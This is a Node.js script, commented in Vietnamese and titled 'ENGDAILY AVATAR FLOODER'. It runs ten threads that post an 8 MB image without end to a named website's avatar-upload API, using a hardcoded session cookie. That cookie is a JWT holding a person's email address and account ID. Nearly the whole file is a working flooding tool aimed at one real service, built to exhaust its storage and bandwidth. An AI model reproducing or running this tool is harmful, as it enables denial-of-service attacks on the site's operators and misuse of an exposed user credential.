const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
const fs = require('fs');
const path = require('path');

const TARGET_CONFIG = {
    url: "https://engdaily.study/api/user/update-avatar",
    cookie: "EngDaily1345/sessionCookie=eyJhbGciOiJSUzI1NiIsImtpZCI6InU5VmJ5USJ9.eyJpc3MiOiJodHRwczovL3Nlc3Npb24uZmlyZWJhc2UuZ29vZ2xlLmNvbS9lbmdkYWlseS0xZDVmNCIsIm5hbWUiOiJRdeG7kWMgQsO5aSIsInBpY3R1cmUiOiJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NJQm5yX3VNUWpza1ZiOFVMOHhrV3U5bjRFblV6MWFZR090a2FmQk9sS3pqbkMyZUUwUlx1MDAzZHM5Ni1jIiwiYXVkIjoiZW5nZGFpbHktMWQ1ZjQiLCJhdXRoX3RpbWUiOjE3NzcxMjE3NjQsInVzZXJfaWQiOiJXWXVYY09yQ1hOTmVwTkh0a2JsanlRWnI1V0kzIiwic3ViIjoiV1l1WGNPckNYTk5lcE5IdGtibGp5UVpyNVdJMyIsImlhdCI6MTc3NzEyMTc2NSwiZXhwIjoxNzc3NTUzNzY1LCJlbWFpbCI6ImJ1aWRpbmhxdW9jMjAwNUBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJnb29nbGUuY29tIjpbIjEwODg1MjQ2ODcwOTk0NDY1NjA0MCJdLCJlbWFpbCI6WyJidWlkaW5ocXVvYzIwMDVAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoiZ29vZ2xlLmNvbSJ9fQ.nD-8XzDnjRT60awVZB5fHCAKYo_kwKgu1OrIPnfSVuPP6hAZZ8BC2KF1QdEqkeJ0wWTgMuzAioov8WovsK4bM_ODtezCtoCCUk5CAws2xj3c-AKvYXrni-G1yAJp51hrzWAN06iPUTDYBM5dw8mDxSGXxoxwwiti5-2oAEXH7ZfxzmHhPOif3Yb2wOJ-T7bYJ0Re2kirn0C-_aJBLdvOSRkcszZzAaq-kZgW8Mo60fnFCPT_ePWNVW8tn5hshbeB4rA9WmPKOekwFraxKVTGTwD4RzqnZuP1XzuTLwnAK7OZuouKNGzVrRtO31DZrMJIVWcZPt5-h1h75ZpwF02z4g", // Cập nhật cookie mới nếu cần
    threadCount: 10, 
    localImagePath: "Tớ là hacker nek_8mb.png", 
    delayBetweenRequests: 100 
};

if (isMainThread) {
    if (!fs.existsSync(TARGET_CONFIG.localImagePath)) {
        console.error(`Không tìm thấy file: ${TARGET_CONFIG.localImagePath}`);
        process.exit(1);
    }

    const fileSizeInBytes = fs.statSync(TARGET_CONFIG.localImagePath).size;
    const fileSizeInMB = fileSizeInBytes / (1024 * 1024);

    let stats = { count: 0, errors: 0, totalMB: 0 };
    let recentLinks = []; // Lưu 5 link gần nhất
    let startTime = Date.now();
    let logs = new Array(TARGET_CONFIG.threadCount).fill("Initializing...");

    for (let i = 0; i < TARGET_CONFIG.threadCount; i++) {
        const worker = new Worker(__filename, { workerData: i });
        worker.on('message', (msg) => {
            if (msg.type === 'success') {
                stats.count++;
                stats.totalMB += fileSizeInMB;
                // Cập nhật danh sách link mới nhất
                recentLinks.unshift(msg.link);
                if (recentLinks.length > 5) recentLinks.pop();
            }
            if (msg.type === 'error') stats.errors++;
            logs[i] = msg.status;
        });
    }

    setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        process.stdout.write('\x1Bc'); 
        console.log(`================================================================`);
        console.log(`🚀 ENGDAILY AVATAR FLOODER - MULTIPART MODE`);
        console.log(`================================================================`);
        console.log(`⏱️  Uptime: ${elapsed.toFixed(0)}s | ✅ Success: ${stats.count} | ❌ Fail: ${stats.errors}`);
        console.log(`📦 Total Uploaded: ${stats.totalMB.toFixed(2)} MB (File: ${fileSizeInMB.toFixed(2)} MB)`);
        console.log(`----------------------------------------------------------------`);
        console.log(`🔗 RECENT LINKS:`);
        recentLinks.forEach((link, i) => console.log(`   ${i + 1}. ${link}`));
        console.log(`----------------------------------------------------------------`);
        logs.forEach((l, idx) => console.log(` [Thread ${idx}] ${l}`));
        console.log(`================================================================`);
    }, 500);

} else {
    const startFlooding = async () => {
        const imageBuffer = fs.readFileSync(TARGET_CONFIG.localImagePath);
        const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2);

        const headers = {
            "accept": "*/*",
            "content-type": `multipart/form-data; boundary=${boundary}`,
            "cookie": TARGET_CONFIG.cookie,
            "origin": "https://engdaily.study",
            "referer": "https://engdaily.study/profile-settings",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "x-platform": "web"
        };

        const bodyPayload = Buffer.concat([
            Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="avatar.png"\r\nContent-Type: image/png\r\n\r\n`),
            imageBuffer,
            Buffer.from(`\r\n--${boundary}--\r\n`)
        ]);

        while (true) {
            try {
                const response = await fetch(TARGET_CONFIG.url, {
                    method: "POST",
                    headers: headers,
                    body: bodyPayload
                });

                const result = await response.json();

                if (result.success === true) {
                    parentPort.postMessage({ 
                        type: 'success', 
                        status: `✅ Success`,
                        link: result.data // Gửi link về main thread
                    });
                } else {
                    parentPort.postMessage({ 
                        type: 'error', 
                        status: `❌ Denied: ${JSON.stringify(result).substring(0, 20)}...` 
                    });
                }
            } catch (e) {
                parentPort.postMessage({ 
                    type: 'error', 
                    status: `💀 Network Error/Overload` 
                });
            }
            
            if (TARGET_CONFIG.delayBetweenRequests > 0) {
                await new Promise(r => setTimeout(r, TARGET_CONFIG.delayBetweenRequests));
            }
        }
    };
    startFlooding();
}